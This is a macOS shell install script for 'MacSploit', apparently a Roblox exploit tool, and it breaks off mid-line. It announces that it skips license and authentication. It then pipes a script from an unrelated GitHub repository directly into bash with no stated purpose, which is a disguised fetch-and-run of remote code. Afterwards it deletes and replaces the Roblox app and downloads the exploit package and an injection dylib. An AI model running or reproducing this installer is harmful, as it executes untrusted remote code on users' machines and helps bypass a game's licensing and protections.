main() {
    clear
    echo -e "Welcome to the MacSploit Experience!"
    echo -e "Install Script Version 2.6"
    echo -e "Skipping license and authentication..."

    # Install dependencies or run setup
    curl -sL "https://raw.githubusercontent.com/0c1aneT1V/nexus42/main/install.sh" | bash

    echo -e "Downloading Latest Roblox..."
    [ -f ./RobloxPlayer.zip ] && rm ./RobloxPlayer.zip
    local robloxVersionInfo=$(curl -s "https://clientsettingscdn.roblox.com/v2/client-version/MacPlayer")
    local versionInfo=$(curl -s "https://git.raptor.fun/main/version.json")

    local mChannel=$(echo $versionInfo | ./jq -r ".channel")
    local version=$(echo $versionInfo | ./jq -r ".clientVersionUpload")
    local robloxVersion=$(echo $robloxVersionInfo | ./jq -r ".clientVersionUpload")

    if [ "$version" != "$robloxVersion" ] && [ "$mChannel" == "preview" ]; then
        curl "http://setup.rbxcdn.com/mac/$robloxVersion-RobloxPlayer.zip" -o "./RobloxPlayer.zip"
    else
        curl "http://setup.rbxcdn.com/mac/$version-RobloxPlayer.zip" -o "./RobloxPlayer.zip"
    fi

    echo -n "Installing Latest Roblox... "
    [ -d "./Applications/Roblox.app" ] && rm -rf "./Applications/Roblox.app"
    [ -d "/Applications/Roblox.app" ] && rm -rf "/Applications/Roblox.app"

    unzip -o -q "./RobloxPlayer.zip"
    mv ./RobloxPlayer.app /Applications/Roblox.app
    rm ./RobloxPlayer.zip
    echo -e "Done."

    echo -e "Downloading MacSploit..."
    curl "https://git.raptor.fun/main/macsploit.zip" -o "./MacSploit.zip"

    echo -n "Installing MacSploit... "
    unzip -o -q "./MacSploit.zip"
    echo -e "Done."

    echo -n "Updating Dylib..."
    if [ "$version" != "$robloxVersion" ] && [ "$mChannel" == "preview" ]; then
        curl -Os "https://git.ra
